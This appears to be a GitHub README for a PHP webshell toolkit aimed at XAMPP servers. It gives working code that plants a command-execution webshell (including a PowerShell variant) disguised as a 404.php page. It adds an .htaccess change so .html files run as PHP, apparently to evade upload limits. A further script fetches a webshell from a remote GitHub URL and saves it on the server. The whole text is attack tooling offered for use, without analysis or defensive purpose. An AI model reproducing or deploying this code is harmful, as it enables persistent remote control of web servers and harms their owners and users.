Dev_Console webshell

<img width="1920" height="838" alt="dev_console" src="https://github.com/user-attachments/assets/5e679b3f-8f01-4881-9b72-416cbb4e7082" not


Dev_Dashboard Webshell

<img width="1920" height="804" alt="dev_dashboard" src="https://github.com/user-attachments/assets/46b384f6-1933-437f-bb7e-8d505604c024" />



Create PHP Webshell on Server

```
<?php
$file = '../htdocs/dashboard/jp/404.php';
$code = "<?php system(\$_GET['cmd']); ?>";
file_put_contents($file, $code);
echo "Webshell written to $file";
?>
```

C:\xampp\htdocs\dashboard\jp\404.php
```
<?php
$file = '../htdocs/dashboard/jp/404.php';
$code = "<?php system('powershell -Command \"'.\$_GET['cmd'].'\"'); ?>";
file_put_contents($file, $code);
echo "PowerShell webshell written to $file";
?>
```


If Unable to create PHP file on webserver do this

Perfect — you want a PHP script that adds these lines to the .htaccess file so that .html files are executed as PHP. Here’s a ready-to-use script:

```
<?php
// Path to your .htaccess file
$htaccessFile = 'C:/xampp/htdocs/.htaccess';

// Lines to add
$linesToAdd = <<<EOL
AddType application/x-httpd-php .html
AddHandler application/x-httpd-php .html

EOL;

// Check if .htaccess exists; if not, create it
if (!file_exists($htaccessFile)) {
    file_put_contents($htaccessFile, $linesToAdd);
    echo ".htaccess created and lines added successfully.";
} else {
    // Read current content
    $current = file_get_contents($htaccessFile);

    // Avoid duplicate lines
    if (strpos($current, 'AddType application/x-httpd-php .html') === false) {
        file_put_contents($htaccessFile, $linesToAdd, FILE_APPEND);
        echo "Lines appended to existing .htaccess successfully.";
    } else {
        echo "Lines already exist in .htaccess, no changes made.";
    }
}

// Optional: display current .htaccess content
echo "<h3>Current .htaccess content:</h3>";
echo "<pre>" . htmlspecialchars(file_get_contents($htaccessFile)) . "</pre>";
?>
```

PHP Code to Download file on Server

```
<?php
$url  = "https://raw.githubusercontent.com/davidsmithmaster133-creator/Webshells/refs/heads/main/devconsole.php"; // your raw GitHub URL
$save = "C:/xampp/htdocs/dashboard/jp/test.php";

$data = file_get_contents($url);

if ($data === false) {
    die("Download failed.");
}

/* STEP 2: Save to disk */
if (file_put_contents($save, $data) === false) {
    die("Saving failed.");
}

echo "File saved successfully.<br><br>";

/* STEP 3: Re-open saved file */
$handle = fopen($save, "r");
if (!$handle) {
    die("Cannot open saved file.");
}

echo "<h3>Saved File Content:</h3>";
echo "<pre>";

while (!feof($handle)) {
    echo htmlspecialchars(fgets($handle));
}

echo "</pre>";

fclose($handle);
?>
```
